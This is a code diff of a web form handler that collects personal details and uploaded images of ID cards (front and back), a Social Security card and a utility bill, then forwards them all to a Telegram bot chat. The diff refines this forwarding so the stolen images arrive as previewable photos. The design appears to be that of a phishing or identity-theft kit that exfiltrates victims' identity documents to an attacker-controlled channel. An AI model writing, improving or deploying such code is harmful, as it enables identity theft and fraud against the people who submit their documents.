@@ -14,7 +14,7 @@ export default async function handler(req, res) {
     return res.status(405).json({ message: "Method not allowed" });
   }
 
-  const form = formidable({ multiples: true }); // ✅ FIXED HERE
+  const form = formidable({ multiples: true });
 
   form.parse(req, async (err, fields, files) => {
     if (err) {
@@ -22,8 +22,6 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: "Form parse error" });
     }
 
-    // const BOT_TOKEN = process.env.BOT_TOKEN;
-    // const CHAT_ID = process.env.CHAT_ID;
     const BOT_TOKEN = process.env.BOT_TOKEN;
     const CHAT_ID = process.env.CHAT_ID;
 
@@ -55,19 +53,16 @@ export default async function handler(req, res) {
 🌍 Place of Birth: ${fields.birthPlace}
 `;
 
-      await fetch(
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-          }),
-        }
-      );
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+        }),
+      });
 
-      // ✅ Send files
+      // ✅ Send files as PHOTOS (previewable in Telegram)
       const fileFields = ["idFront", "idBack", "ssnCard", "utilityBill"];
 
       for (let field of fileFields) {
@@ -78,10 +73,19 @@ export default async function handler(req, res) {
 
           const formData = new FormData();
           formData.append("chat_id", CHAT_ID);
-          formData.append("document", fs.createReadStream(file.filepath));
+
+          // Send as photo instead of document
+          formData.append(
+            "photo",
+            fs.createReadStream(file.filepath),
+            {
+              filename: `${field}.jpg`,
+              contentType: "image/jpeg",
+            }
+          );
 
           await fetch(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
             {
               method: "POST",
               body: formData,
